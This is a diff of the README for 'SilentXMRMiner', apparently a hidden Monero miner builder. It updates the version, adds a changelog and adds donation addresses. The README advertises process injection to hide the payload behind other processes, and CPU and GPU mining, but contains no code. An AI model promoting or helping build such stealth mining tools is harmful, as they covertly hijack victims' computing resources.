@@ -1,7 +1,7 @@
 
 <img src="https://i.imgur.com/Q581tsw.png">
 
-# SilentXMRMiner v0.1 - Based on Lime Miner v0.3
+# SilentXMRMiner v0.2 - Based on Lime Miner v0.3
 
 
 ## Main Features
@@ -10,7 +10,7 @@
  
 * Codedom - No need for external libraries to compile
 
-* Injection - Hide payload behind a legit process "explorer.exe"
+* Injection - Hide payload behind another process
 
 * CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
   
@@ -23,6 +23,13 @@ To open project you need:
 
 2- This repository
 
+## Changes
+
+# v0.2 (05/08/2019)
+* Added more injection prccess choices
+* Added Max CPU choice
+# v0.1 (03/08/2019)
+* Inital release
 
 ## Author
 
@@ -48,3 +55,5 @@ This project is licensed under the MIT License - see the [LICENSE](/LICENSE) fil
 ## Donate
 
 XMR: 4Aw8Echp2Hrhc5ussZ5cX1bKS6AFJUqFMJH9373M819NCLMVs4DctwGgtTg1ixc8oqVhZNeKCSTS776xoihXmX8SNYx7vtv
+BTC: 38Zs9ScPSWNm1DPFcsnkWgJBXtnEjxnuSo
+ETH: 0x00863B87B5b4f044A19865c756075450Adb20dbA
